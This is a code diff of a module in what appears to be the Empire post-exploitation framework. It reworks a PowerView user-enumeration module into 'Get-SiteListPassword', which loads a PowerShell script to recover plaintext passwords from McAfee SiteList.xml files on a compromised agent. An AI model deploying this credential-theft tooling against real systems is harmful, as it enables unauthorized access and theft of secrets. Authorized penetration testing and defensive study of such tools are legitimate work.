@@ -5,11 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Get-NetLoggedon',
+            'Name': 'Get-SiteListPassword',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@harmj0y', '@funoverip'],
 
-            'Description': ('Execute the NetWkstaUserEnum Win32API call to query a given host for actively logged on users. Part of PowerView.'),
+            'Description': ("Retrieves the plaintext passwords for found McAfee's SiteList.xml files."),
 
             'Background' : True,
 
@@ -21,7 +21,9 @@ class Module:
             
             'MinPSVersion' : '2',
             
-            'Comments': [ ]
+            'Comments': [
+                'https://github.com/funoverip/mcafee-sitelist-pwd-decryption/'
+            ]
         }
 
         # any options needed by the module, settable during runtime
@@ -32,18 +34,13 @@ class Module:
                 'Description'   :   'Agent to run module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'ComputerName' : {
-                'Description'   :   'The hostname or IP to query for local group users.',
-                'Required'      :   False,
-                'Value'         :   'localhost'
             }
         }
-
+        
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -53,10 +50,8 @@ class Module:
 
     def generate(self):
 
-        moduleName = self.info["Name"]
-        
-        # read in the common powerview.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-SiteListPassword.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -67,10 +62,9 @@ class Module:
         moduleCode = f.read()
         f.close()
 
-        # get just the code needed for the specified function
-        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
+        script = moduleCode
 
-        script += moduleName + " "
+        script += "Get-SiteListPassword "
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
@@ -81,6 +75,6 @@ class Module:
                     else:
                         script += " -" + str(option) + " " + str(values['Value']) 
 
-        script += ' | ft -wrap | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
-
+        script += "| Out-String | %{$_ + \"`n\"};"
+        script += "'Get-SiteListPassword completed'"
         return script
